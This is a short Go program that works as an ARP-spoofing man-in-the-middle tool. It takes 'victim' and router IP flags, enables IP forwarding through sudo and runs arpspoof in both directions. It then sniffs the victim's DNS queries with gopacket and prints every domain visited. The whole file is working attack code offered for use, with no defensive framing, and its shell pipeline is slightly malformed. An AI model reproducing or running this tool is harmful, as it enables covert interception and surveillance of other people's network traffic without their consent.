package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func main() {
	var victim string
	var router string
	var device string
	flag.StringVar(&device, "iface", "wlan0", "specify the device like wla0,eth0 ...")
	flag.StringVar(&router, "router", "", "specify the router private ip  ex: 192.168.1.1")
	flag.StringVar(&victim, "victim", "", "specify the victim ip address ex: 192.168.1.10")
	flag.Parse()

	if router != "" && victim != "" {
		cmd := exec.Command("/bin/sh", "-c", "echo 1 | sudo echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
		if err := cmd.Run(); err != nil {
			panic(err)
		}

		go func() {
			cmd := exec.Command("/bin/sh", "-c", fmt.Sprintf("arpspoof -t %s %s", router, victim ))
			if err := cmd.Run(); err != nil {
				panic(err)
			}
			cmd.Stdout = os.Stdout

		}()

		go func() {
			cmd := exec.Command("/bin/sh", "-c", fmt.Sprintf("arpspoof -t %s %s", victim, router ))
			if err := cmd.Run(); err != nil {
				panic(err)
			}
			cmd.Stdout = os.Stdout

		}()
	}

	snapshotLen := int32(1024)
	promiscuous := true
	timeout := pcap.BlockForever

	handle, err := pcap.OpenLive(device, snapshotLen, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	//TODO:  implmnt diff protocols.

	var filter = "udp and port 53"
	err = handle.SetBPFFilter(filter)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("Listening for DNS queries on", device)

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		dnsLayer := packet.Layer(layers.LayerTypeDNS)
		if dnsLayer == nil {
			continue
		}

		dns, _ := dnsLayer.(*layers.DNS)
		for _, question := range dns.Questions {
			domain := string(question.Name)
			if !strings.HasSuffix(domain, "in-addr.arpa") {
				fmt.Println("Visited Domain:", domain)
			}
		}
	}
}
